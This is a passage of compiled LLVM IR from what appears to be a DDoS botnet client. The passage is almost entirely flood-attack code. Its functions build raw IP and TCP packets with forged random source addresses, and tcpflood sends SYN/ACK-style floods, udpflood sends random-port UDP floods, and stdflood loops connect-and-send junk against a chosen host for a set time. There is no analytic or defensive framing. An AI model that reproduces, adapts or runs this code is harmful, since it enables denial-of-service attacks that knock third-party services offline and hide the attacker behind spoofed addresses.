  %.014 = phi i64 [ %23, %.lr.ph16 ], [ %.014.ph, %.lr.ph16.preheader34 ]
  %.0913 = phi i32 [ %24, %.lr.ph16 ], [ %.0913.ph, %.lr.ph16.preheader34 ]
  %.01012 = phi i16* [ %20, %.lr.ph16 ], [ %.01012.ph, %.lr.ph16.preheader34 ]
  %20 = getelementptr inbounds i16, i16* %.01012, i64 1
  %21 = load i16, i16* %.01012, align 2
  %22 = zext i16 %21 to i64
  %23 = add i64 %22, %.014
  %24 = add nsw i32 %.0913, -2
  %25 = icmp sgt i32 %24, 1
  br i1 %25, label %.lr.ph16, label %._crit_edge17.loopexit.loopexit, !llvm.loop !5

._crit_edge17.loopexit.loopexit:                  ; preds = %.lr.ph16
  br label %._crit_edge17.loopexit

._crit_edge17.loopexit:                           ; preds = %._crit_edge17.loopexit.loopexit, %middle.block
  %.lcssa25 = phi i64 [ %19, %middle.block ], [ %23, %._crit_edge17.loopexit.loopexit ]
  %scevgep = getelementptr i16, i16* %0, i64 %6
  %26 = sub i32 %4, %7
  br label %._crit_edge17

._crit_edge17:                                    ; preds = %._crit_edge17.loopexit, %2
  %.010.lcssa = phi i16* [ %0, %2 ], [ %scevgep, %._crit_edge17.loopexit ]
  %.09.lcssa = phi i32 [ %1, %2 ], [ %26, %._crit_edge17.loopexit ]
  %.0.lcssa = phi i64 [ 0, %2 ], [ %.lcssa25, %._crit_edge17.loopexit ]
  %27 = icmp eq i32 %.09.lcssa, 1
  br i1 %27, label %28, label %.preheader

; <label>:28:                                     ; preds = %._crit_edge17
  %29 = bitcast i16* %.010.lcssa to i8*
  %30 = load i8, i8* %29, align 1
  %31 = zext i8 %30 to i64
  %32 = add i64 %31, %.0.lcssa
  br label %.preheader

.preheader:                                       ; preds = %28, %._crit_edge17
  %.1.ph = phi i64 [ %.0.lcssa, %._crit_edge17 ], [ %32, %28 ]
  %33 = lshr i64 %.1.ph, 16
  %34 = icmp eq i64 %33, 0
  br i1 %34, label %._crit_edge, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %35 = phi i64 [ %38, %.lr.ph ], [ %33, %.lr.ph.preheader ]
  %.111 = phi i64 [ %37, %.lr.ph ], [ %.1.ph, %.lr.ph.preheader ]
  %36 = and i64 %.111, 65535
  %37 = add nuw nsw i64 %36, %35
  %38 = lshr i64 %37, 16
  %39 = icmp eq i64 %38, 0
  br i1 %39, label %._crit_edge.loopexit, label %.lr.ph

._crit_edge.loopexit:                             ; preds = %.lr.ph
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %.preheader
  %.1.lcssa = phi i64 [ %.1.ph, %.preheader ], [ %37, %._crit_edge.loopexit ]
  %40 = trunc i64 %.1.lcssa to i16
  %41 = xor i16 %40, -1
  ret i16 %41
}

; Function Attrs: noinline nounwind uwtable
define zeroext i16 @tcpcsum(%struct.iphdr* nocapture readonly, %struct.tcphdr* nocapture readonly) local_unnamed_addr #1 {
  %3 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  %4 = bitcast i32* %3 to <2 x i32>*
  %5 = load <2 x i32>, <2 x i32>* %4, align 4
  %6 = zext <2 x i32> %5 to <2 x i64>
  %7 = tail call noalias i8* @malloc(i64 24) #8
  %8 = bitcast i8* %7 to i16*
  %9 = bitcast i8* %7 to <2 x i64>*
  store <2 x i64> %6, <2 x i64>* %9, align 1
  %.sroa.3.0..sroa_idx = getelementptr inbounds i8, i8* %7, i64 16
  store i8 0, i8* %.sroa.3.0..sroa_idx, align 1
  %.sroa.4.0..sroa_raw_idx = getelementptr inbounds i8, i8* %7, i64 17
  store i8 6, i8* %.sroa.4.0..sroa_raw_idx, align 1
  %10 = getelementptr inbounds i8, i8* %7, i64 24
  %11 = bitcast %struct.tcphdr* %1 to i8*
  tail call void @llvm.memcpy.p0i8.p0i8.i64(i8* %10, i8* %11, i64 20, i32 1, i1 false)
  %12 = tail call zeroext i16 @csum(i16* %8, i32 24)
  tail call void @free(i8* %7) #8
  ret i16 %12
}

; Function Attrs: nounwind
declare noalias i8* @malloc(i64) local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memcpy.p0i8.p0i8.i64(i8* nocapture writeonly, i8* nocapture readonly, i64, i32, i1) #5

; Function Attrs: nounwind
declare void @free(i8* nocapture) local_unnamed_addr #4

; Function Attrs: noinline norecurse nounwind uwtable
define void @makeIPPacket(%struct.iphdr* nocapture, i32, i32, i8 zeroext, i32) local_unnamed_addr #0 {
  %6 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 0
  store i8 69, i8* %6, align 4
  %7 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 1
  store i8 0, i8* %7, align 1
  %8 = trunc i32 %4 to i16
  %9 = add i16 %8, 20
  %10 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 2
  store i16 %9, i16* %10, align 2
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  %13 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 3
  store i16 %12, i16* %13, align 4
  %14 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 4
  store i16 0, i16* %14, align 2
  %15 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 5
  store i8 -1, i8* %15, align 4
  %16 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 6
  store i8 %3, i8* %16, align 1
  %17 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 7
  store i16 0, i16* %17, align 2
  %18 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 8
  store i32 %2, i32* %18, align 4
  %19 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %0, i64 0, i32 9
  store i32 %1, i32* %19, align 4
  ret void
}

; Function Attrs: noinline nounwind uwtable
define i32 @getHost(i8*, %struct.in_addr* nocapture) local_unnamed_addr #1 {
  %3 = tail call i32 @inet_addr(i8* %0) #8
  %4 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %1, i64 0, i32 0
  store i32 %3, i32* %4, align 4
  %5 = icmp eq i32 %3, -1
  %. = zext i1 %5 to i32
  ret i32 %.
}

; Function Attrs: nounwind
declare i32 @inet_addr(i8*) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @filter(i8* nocapture) local_unnamed_addr #1 {
  br label %2

; <label>:2:                                      ; preds = %.critedge, %1
  %3 = tail call i64 @strlen(i8* %0) #13
  %4 = add i64 %3, -1
  %5 = getelementptr inbounds i8, i8* %0, i64 %4
  %6 = load i8, i8* %5, align 1
  switch i8 %6, label %10 [
    i8 13, label %.critedge
    i8 10, label %.critedge
  ]

.critedge:                                        ; preds = %2, %2
  %7 = tail call i64 @strlen(i8* nonnull %0) #13
  %8 = add i64 %7, -1
  %9 = getelementptr inbounds i8, i8* %0, i64 %8
  store i8 0, i8* %9, align 1
  br label %2

; <label>:10:                                     ; preds = %2
  ret void
}

; Function Attrs: nounwind readonly
declare i64 @strlen(i8* nocapture) local_unnamed_addr #6

; Function Attrs: noinline nounwind uwtable
define noalias i8* @makestring() local_unnamed_addr #1 {
  %1 = alloca [1024 x i8], align 16
  %2 = tail call i32 @rand() #8
  %3 = srem i32 %2, 5
  %4 = add nsw i32 %3, 4
  %5 = add nsw i32 %3, 5
  %6 = sext i32 %5 to i64
  %7 = tail call noalias i8* @malloc(i64 %6) #8
  tail call void @llvm.memset.p0i8.i64(i8* %7, i8 0, i64 %6, i32 1, i1 false)
  %8 = tail call %struct._IO_FILE* @fopen(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.40, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.41, i64 0, i64 0))
  %9 = icmp eq %struct._IO_FILE* %8, null
  br i1 %9, label %.preheader, label %18

.preheader:                                       ; preds = %0
  %10 = icmp sgt i32 %3, -4
  br i1 %10, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.preheader
  %11 = sext i32 %4 to i64
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.lr.ph
  %indvars.iv = phi i64 [ 0, %.lr.ph.preheader ], [ %indvars.iv.next, %.lr.ph ]
  %12 = tail call i32 @rand() #8
  %13 = srem i32 %12, 26
  %14 = add nsw i32 %13, 65
  %15 = trunc i32 %14 to i8
  %16 = getelementptr inbounds i8, i8* %7, i64 %indvars.iv
  store i8 %15, i8* %16, align 1
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %17 = icmp slt i64 %indvars.iv.next, %11
  br i1 %17, label %.lr.ph, label %.loopexit.loopexit

; <label>:18:                                     ; preds = %0
  %19 = tail call i32 @rand() #8
  %20 = tail call i32 @rand() #8
  %21 = mul nsw i32 %20, %19
  %22 = srem i32 %21, 45402
  %23 = icmp slt i32 %22, 0
  %24 = getelementptr inbounds [1024 x i8], [1024 x i8]* %1, i64 0, i64 0
  br i1 %23, label %._crit_edge, label %.lr.ph18.preheader

.lr.ph18.preheader:                               ; preds = %18
  br label %.lr.ph18

.lr.ph18:                                         ; preds = %.lr.ph18.preheader, %.lr.ph18
  %.117 = phi i32 [ %26, %.lr.ph18 ], [ 0, %.lr.ph18.preheader ]
  %25 = call i8* @fgets(i8* nonnull %24, i32 1024, %struct._IO_FILE* nonnull %8)
  %26 = add nuw nsw i32 %.117, 1
  %exitcond = icmp eq i32 %.117, %22
  br i1 %exitcond, label %._crit_edge.loopexit, label %.lr.ph18

._crit_edge.loopexit:                             ; preds = %.lr.ph18
  br label %._crit_edge

._crit_edge:                                      ; preds = %._crit_edge.loopexit, %18
  call void @llvm.memset.p0i8.i64(i8* nonnull %24, i8 0, i64 1024, i32 16, i1 false)
  %27 = call i8* @fgets(i8* nonnull %24, i32 1024, %struct._IO_FILE* nonnull %8)
  call void @filter(i8* nonnull %24)
  %28 = sext i32 %4 to i64
  call void @llvm.memcpy.p0i8.p0i8.i64(i8* %7, i8* nonnull %24, i64 %28, i32 1, i1 false)
  %29 = call i32 @fclose(%struct._IO_FILE* nonnull %8)
  br label %.loopexit

.loopexit.loopexit:                               ; preds = %.lr.ph
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %._crit_edge
  ret i8* %7
}

; Function Attrs: nounwind
declare i32 @rand() local_unnamed_addr #4

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #5

; Function Attrs: nounwind
declare noalias %struct._IO_FILE* @fopen(i8* nocapture readonly, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @fgets(i8*, i32, %struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @fclose(%struct._IO_FILE* nocapture) local_unnamed_addr #4

; Function Attrs: noinline nounwind uwtable
define void @udpflood(i8*, i32, i32, i32) local_unnamed_addr #1 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 2, i16* %6, align 4
  %7 = icmp eq i32 %1, 0
  br i1 %7, label %8, label %11

; <label>:8:                                      ; preds = %4
  %9 = tail call i32 @rand_cmwc()
  %10 = trunc i32 %9 to i16
  br label %14

; <label>:11:                                     ; preds = %4
  %12 = trunc i32 %1 to i16
  %13 = tail call zeroext i16 @htons(i16 zeroext %12) #12
  br label %14

; <label>:14:                                     ; preds = %11, %8
  %.sink = phi i16 [ %13, %11 ], [ %10, %8 ]
  %15 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %.sink, i16* %15, align 2
  %16 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %17 = call i32 @getHost(i8* %0, %struct.in_addr* %16)
  %18 = icmp eq i32 %17, 0
  br i1 %18, label %19, label %.loopexit

; <label>:19:                                     ; preds = %14
  %20 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 3, i64 0
  %21 = bitcast i8* %20 to i64*
  store i64 0, i64* %21, align 4
  %22 = tail call i32 @socket(i32 2, i32 2, i32 17) #8
  %23 = icmp eq i32 %22, 0
  br i1 %23, label %.loopexit, label %24

; <label>:24:                                     ; preds = %19
  %25 = add nsw i32 %3, 1
  %26 = sext i32 %25 to i64
  %27 = tail call noalias i8* @malloc(i64 %26) #8
  %28 = icmp eq i8* %27, null
  br i1 %28, label %.loopexit, label %29

; <label>:29:                                     ; preds = %24
  tail call void @llvm.memset.p0i8.i64(i8* nonnull %27, i8 0, i64 %26, i32 1, i1 false)
  tail call void @makeRandomStr(i8* nonnull %27, i32 %3)
  %30 = tail call i64 @time(i64* null) #8
  %31 = zext i32 %2 to i64
  %32 = add i64 %30, %31
  %33 = sext i32 %3 to i64
  %34 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %sext = shl i64 %32, 32
  %35 = ashr exact i64 %sext, 32
  br i1 %7, label %.split.us.preheader, label %.split.preheader

.split.preheader:                                 ; preds = %29
  br label %.split

.split.us.preheader:                              ; preds = %29
  br label %.split.us

.split.us:                                        ; preds = %.split.us.backedge, %.split.us.preheader
  %.058.us = phi i32 [ 0, %.split.us.preheader ], [ %.058.us.be, %.split.us.backedge ]
  %36 = call i64 @sendto(i32 %22, i8* nonnull %27, i64 %33, i32 0, %struct.sockaddr* nonnull %34, i32 16) #8
  %37 = icmp eq i32 %.058.us, 10
  br i1 %37, label %40, label %38

; <label>:38:                                     ; preds = %.split.us
  %39 = add i32 %.058.us, 1
  br label %.split.us.backedge

; <label>:40:                                     ; preds = %.split.us
  %41 = call i32 @rand_cmwc()
  %42 = trunc i32 %41 to i16
  store i16 %42, i16* %15, align 2
  %43 = call i64 @time(i64* null) #8
  %44 = icmp sgt i64 %43, %35
  br i1 %44, label %.loopexit.loopexit, label %.split.us.backedge

.split.us.backedge:                               ; preds = %40, %38
  %.058.us.be = phi i32 [ %39, %38 ], [ 0, %40 ]
  br label %.split.us

.split:                                           ; preds = %.split.backedge, %.split.preheader
  %.058 = phi i32 [ 0, %.split.preheader ], [ %.058.be, %.split.backedge ]
  %45 = call i64 @sendto(i32 %22, i8* nonnull %27, i64 %33, i32 0, %struct.sockaddr* nonnull %34, i32 16) #8
  %46 = icmp eq i32 %.058, 10
  br i1 %46, label %47, label %50

; <label>:47:                                     ; preds = %.split
  %48 = call i64 @time(i64* null) #8
  %49 = icmp sgt i64 %48, %35
  br i1 %49, label %.loopexit.loopexit64, label %.split.backedge

; <label>:50:                                     ; preds = %.split
  %51 = add i32 %.058, 1
  br label %.split.backedge

.split.backedge:                                  ; preds = %50, %47
  %.058.be = phi i32 [ %51, %50 ], [ 0, %47 ]
  br label %.split

.loopexit.loopexit:                               ; preds = %40
  br label %.loopexit

.loopexit.loopexit64:                             ; preds = %47
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit64, %.loopexit.loopexit, %19, %14, %24
  ret void
}

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i64 @time(i64*) local_unnamed_addr #4

declare i64 @sendto(i32, i8*, i64, i32, %struct.sockaddr*, i32) local_unnamed_addr #7

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare void @srand(i32) local_unnamed_addr #4

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #8

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare void @llvm.stackrestore(i8*) #8

; Function Attrs: noinline nounwind uwtable
define void @tcpflood(i8*, i32, i32, i32, i8*) local_unnamed_addr #1 {
  %6 = alloca %struct.sockaddr_in, align 4
  %7 = alloca i32, align 4
  %8 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 0
  store i16 2, i16* %8, align 4
  %9 = icmp eq i32 %1, 0
  br i1 %9, label %10, label %13

; <label>:10:                                     ; preds = %5
  %11 = tail call i32 @rand_cmwc()
  %12 = trunc i32 %11 to i16
  br label %16

; <label>:13:                                     ; preds = %5
  %14 = trunc i32 %1 to i16
  %15 = tail call zeroext i16 @htons(i16 zeroext %14) #12
  br label %16

; <label>:16:                                     ; preds = %13, %10
  %.sink = phi i16 [ %15, %13 ], [ %12, %10 ]
  %17 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 1
  store i16 %.sink, i16* %17, align 2
  %18 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 2
  %19 = call i32 @getHost(i8* %0, %struct.in_addr* %18)
  %20 = icmp eq i32 %19, 0
  br i1 %20, label %21, label %153

; <label>:21:                                     ; preds = %16
  %22 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %6, i64 0, i32 3, i64 0
  %23 = bitcast i8* %22 to i64*
  store i64 0, i64* %23, align 4
  %24 = tail call i32 @socket(i32 2, i32 3, i32 6) #8
  %25 = icmp eq i32 %24, 0
  br i1 %25, label %153, label %26

; <label>:26:                                     ; preds = %21
  store i32 1, i32* %7, align 4
  %27 = bitcast i32* %7 to i8*
  %28 = call i32 @setsockopt(i32 %24, i32 0, i32 3, i8* nonnull %27, i32 4) #8
  %29 = icmp slt i32 %28, 0
  br i1 %29, label %153, label %30

; <label>:30:                                     ; preds = %26
  %31 = sext i32 %3 to i64
  %32 = add nsw i64 %31, 40
  %33 = call i8* @llvm.stacksave()
  %34 = alloca i8, i64 %32, align 16
  %35 = bitcast i8* %34 to %struct.iphdr*
  %36 = getelementptr i8, i8* %34, i64 20
  %37 = bitcast i8* %36 to %struct.tcphdr*
  %38 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %18, i64 0, i32 0
  %39 = load i32, i32* %38, align 4
  %40 = call i32 @getRandomIP(i32 -1)
  %41 = call i32 @htonl(i32 %40) #12
  %42 = add i32 %3, 20
  call void @makeIPPacket(%struct.iphdr* nonnull %35, i32 %39, i32 %41, i8 zeroext 6, i32 %42)
  %43 = call i32 @rand_cmwc()
  %44 = trunc i32 %43 to i16
  %45 = bitcast i8* %36 to i16*
  store i16 %44, i16* %45, align 4
  %46 = call i32 @rand_cmwc()
  %47 = getelementptr inbounds i8, i8* %34, i64 24
  %48 = bitcast i8* %47 to i32*
  store i32 %46, i32* %48, align 8
  %49 = getelementptr inbounds i8, i8* %34, i64 28
  %50 = bitcast i8* %49 to i32*
  store i32 0, i32* %50, align 4
  %51 = getelementptr inbounds i8, i8* %34, i64 32
  %52 = bitcast i8* %51 to i16*
  %53 = load i16, i16* %52, align 16
  %54 = and i16 %53, -241
  %55 = or i16 %54, 80
  store i16 %55, i16* %52, align 16
  %56 = call i32 @strcmp(i8* %4, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.42, i64 0, i64 0)) #13
  %57 = icmp eq i32 %56, 0
  br i1 %57, label %60, label %.preheader

.preheader:                                       ; preds = %30
  %58 = call i8* @strtok(i8* %4, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #8
  %59 = icmp eq i8* %58, null
  br i1 %59, label %.loopexit, label %.lr.ph.preheader

.lr.ph.preheader:                                 ; preds = %.preheader
  br label %.lr.ph

; <label>:60:                                     ; preds = %30
  %61 = and i16 %53, -8177
  %62 = or i16 %61, 8016
  store i16 %62, i16* %52, align 16
  br label %.loopexit

.lr.ph:                                           ; preds = %.lr.ph.preheader, %.backedge68
  %63 = phi i8* [ %75, %.backedge68 ], [ %58, %.lr.ph.preheader ]
  %64 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.44, i64 0, i64 0)) #13
  %65 = icmp eq i32 %64, 0
  br i1 %65, label %66, label %69

; <label>:66:                                     ; preds = %.lr.ph
  %67 = load i16, i16* %52, align 16
  %68 = or i16 %67, 512
  store i16 %68, i16* %52, align 16
  br label %.backedge68

; <label>:69:                                     ; preds = %.lr.ph
  %70 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.45, i64 0, i64 0)) #13
  %71 = icmp eq i32 %70, 0
  br i1 %71, label %72, label %77

; <label>:72:                                     ; preds = %69
  %73 = load i16, i16* %52, align 16
  %74 = or i16 %73, 1024
  store i16 %74, i16* %52, align 16
  br label %.backedge68

.backedge68:                                      ; preds = %72, %86, %95, %92, %80, %66
  %75 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.43, i64 0, i64 0)) #8
  %76 = icmp eq i8* %75, null
  br i1 %76, label %.loopexit.loopexit, label %.lr.ph

; <label>:77:                                     ; preds = %69
  %78 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.46, i64 0, i64 0)) #13
  %79 = icmp eq i32 %78, 0
  br i1 %79, label %80, label %83

; <label>:80:                                     ; preds = %77
  %81 = load i16, i16* %52, align 16
  %82 = or i16 %81, 256
  store i16 %82, i16* %52, align 16
  br label %.backedge68

; <label>:83:                                     ; preds = %77
  %84 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.47, i64 0, i64 0)) #13
  %85 = icmp eq i32 %84, 0
  br i1 %85, label %86, label %89

; <label>:86:                                     ; preds = %83
  %87 = load i16, i16* %52, align 16
  %88 = or i16 %87, 4096
  store i16 %88, i16* %52, align 16
  br label %.backedge68

; <label>:89:                                     ; preds = %83
  %90 = call i32 @strcmp(i8* nonnull %63, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.48, i64 0, i64 0)) #13
  %91 = icmp eq i32 %90, 0
  br i1 %91, label %92, label %95

; <label>:92:                                     ; preds = %89
  %93 = load i16, i16* %52, align 16
  %94 = or i16 %93, 2048
  store i16 %94, i16* %52, align 16
  br label %.backedge68

; <label>:95:                                     ; preds = %89
  %96 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.49, i64 0, i64 0), i8* nonnull %63)
  br label %.backedge68

.loopexit.loopexit:                               ; preds = %.backedge68
  br label %.loopexit

.loopexit:                                        ; preds = %.loopexit.loopexit, %.preheader, %60
  %97 = call i32 @rand_cmwc()
  %98 = trunc i32 %97 to i16
  %99 = getelementptr inbounds i8, i8* %34, i64 34
  %100 = bitcast i8* %99 to i16*
  store i16 %98, i16* %100, align 2
  %101 = getelementptr inbounds i8, i8* %34, i64 36
  %102 = bitcast i8* %101 to i16*
  store i16 0, i16* %102, align 4
  %103 = getelementptr inbounds i8, i8* %34, i64 38
  %104 = bitcast i8* %103 to i16*
  store i16 0, i16* %104, align 2
  br i1 %9, label %105, label %107

; <label>:105:                                    ; preds = %.loopexit
  %106 = call i32 @rand_cmwc()
  br label %111

; <label>:107:                                    ; preds = %.loopexit
  %108 = trunc i32 %1 to i16
  %109 = call zeroext i16 @htons(i16 zeroext %108) #12
  %110 = zext i16 %109 to i32
  br label %111

; <label>:111:                                    ; preds = %107, %105
  %112 = phi i32 [ %106, %105 ], [ %110, %107 ]
  %113 = trunc i32 %112 to i16
  %114 = getelementptr inbounds i8, i8* %34, i64 22
  %115 = bitcast i8* %114 to i16*
  store i16 %113, i16* %115, align 2
  %116 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %35, %struct.tcphdr* nonnull %37)
  store i16 %116, i16* %102, align 4
  %117 = bitcast i8* %34 to i16*
  %118 = getelementptr inbounds i8, i8* %34, i64 2
  %119 = bitcast i8* %118 to i16*
  %120 = load i16, i16* %119, align 2
  %121 = zext i16 %120 to i32
  %122 = call zeroext i16 @csum(i16* nonnull %117, i32 %121)
  %123 = getelementptr inbounds i8, i8* %34, i64 10
  %124 = bitcast i8* %123 to i16*
  store i16 %122, i16* %124, align 2
  %125 = call i64 @time(i64* null) #8
  %126 = zext i32 %2 to i64
  %127 = add i64 %125, %126
  %128 = bitcast %struct.sockaddr_in* %6 to %struct.sockaddr*
  %129 = getelementptr inbounds i8, i8* %34, i64 12
  %130 = bitcast i8* %129 to i32*
  %131 = getelementptr inbounds i8, i8* %34, i64 4
  %132 = bitcast i8* %131 to i16*
  %sext = shl i64 %127, 32
  %133 = ashr exact i64 %sext, 32
  br label %.backedge

.backedge:                                        ; preds = %.backedge.backedge, %111
  %.0 = phi i32 [ 0, %111 ], [ %.0.be, %.backedge.backedge ]
  %134 = call i64 @sendto(i32 %24, i8* nonnull %34, i64 %32, i32 0, %struct.sockaddr* nonnull %128, i32 16) #8
  %135 = call i32 @getRandomIP(i32 -1)
  %136 = call i32 @htonl(i32 %135) #12
  store i32 %136, i32* %130, align 4
  %137 = call i32 @rand_cmwc()
  %138 = trunc i32 %137 to i16
  store i16 %138, i16* %132, align 4
  %139 = call i32 @rand_cmwc()
  store i32 %139, i32* %48, align 8
  %140 = call i32 @rand_cmwc()
  %141 = trunc i32 %140 to i16
  store i16 %141, i16* %45, align 4
  store i16 0, i16* %102, align 4
  %142 = call zeroext i16 @tcpcsum(%struct.iphdr* nonnull %35, %struct.tcphdr* nonnull %37)
  store i16 %142, i16* %102, align 4
  %143 = load i16, i16* %119, align 2
  %144 = zext i16 %143 to i32
  %145 = call zeroext i16 @csum(i16* nonnull %117, i32 %144)
  store i16 %145, i16* %124, align 2
  %146 = icmp eq i32 %.0, 10
  br i1 %146, label %147, label %150

; <label>:147:                                    ; preds = %.backedge
  %148 = call i64 @time(i64* null) #8
  %149 = icmp sgt i64 %148, %133
  br i1 %149, label %152, label %.backedge.backedge

; <label>:150:                                    ; preds = %.backedge
  %151 = add i32 %.0, 1
  br label %.backedge.backedge

.backedge.backedge:                               ; preds = %150, %147
  %.0.be = phi i32 [ %151, %150 ], [ 0, %147 ]
  br label %.backedge

; <label>:152:                                    ; preds = %147
  call void @llvm.stackrestore(i8* %33)
  br label %153

; <label>:153:                                    ; preds = %21, %16, %26, %152
  ret void
}

; Function Attrs: nounwind readonly
declare i32 @strcmp(i8* nocapture, i8* nocapture) local_unnamed_addr #6

; Function Attrs: nounwind
declare i8* @strtok(i8*, i8* nocapture readonly) local_unnamed_addr #4

; Function Attrs: nounwind
declare i32 @printf(i8* nocapture readonly, ...) local_unnamed_addr #4

; Function Attrs: noinline noreturn nounwind uwtable
define void @stdflood(i8*, i32, i32, i32) local_unnamed_addr #9 {
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = tail call i32 @socket(i32 2, i32 2, i32 0) #8
  %7 = tail call i64 @time(i64* null) #8
  %8 = tail call %struct.hostent* @gethostbyname(i8* %0) #8
  %9 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %9, i8 0, i64 16, i32 4, i1 false)
  %10 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 4
  %11 = load i8**, i8*** %10, align 8
  %12 = load i8*, i8** %11, align 8
  %13 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2
  %14 = bitcast %struct.in_addr* %13 to i8*
  %15 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 3
  %16 = load i32, i32* %15, align 4
  %17 = sext i32 %16 to i64
  call void @bcopy(i8* %12, i8* %14, i64 %17) #8
  %18 = getelementptr inbounds %struct.hostent, %struct.hostent* %8, i64 0, i32 2
  %19 = load i32, i32* %18, align 8
  %20 = trunc i32 %19 to i16
  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  store i16 %20, i16* %21, align 4
  %22 = trunc i32 %1 to i16
  %23 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  store i16 %22, i16* %23, align 2
  %24 = sext i32 %3 to i64
  %25 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %26 = sext i32 %2 to i64
  %27 = add nsw i64 %7, %26
  br label %28

; <label>:28:                                     ; preds = %38, %4
  %.0 = phi i32 [ 0, %4 ], [ %39, %38 ]
  %29 = icmp ugt i32 %.0, 49
  br i1 %29, label %30, label %38

; <label>:30:                                     ; preds = %28
  %31 = call i8* @makestring()
  %32 = call i64 @send(i32 %6, i8* %31, i64 %24, i32 0) #8
  %33 = call i32 @connect(i32 %6, %struct.sockaddr* nonnull %25, i32 16) #8
  %34 = call i64 @time(i64* null) #8
  %35 = icmp slt i64 %34, %27
  br i1 %35, label %38, label %36

; <label>:36:                                     ; preds = %30
  %37 = call i32 @close(i32 %6) #8
  call void @_exit(i32 0) #14
  unreachable

; <label>:38:                                     ; preds = %30, %28
  %.1 = phi i32 [ %.0, %28 ], [ 0, %30 ]
  %39 = add i32 %.1, 1
  br label %28
}

declare %struct.hostent* @gethostbyname(i8*) local_unnamed_addr #7

; Function Attrs: nounwind
declare void @bcopy(i8* nocapture readonly, i8* nocapture, i64) local_unnamed_addr #4

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #7

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #7

declare i32 @close(i32) local_unnamed_addr #7

; Function Attrs: noreturn
declare void @_exit(i32) local_unnamed_addr #10

; Function Attrs: noinline nounwind uwtable
define i32 @socket_connect(i8*, i16 zeroext) local_unnamed_addr #1 {
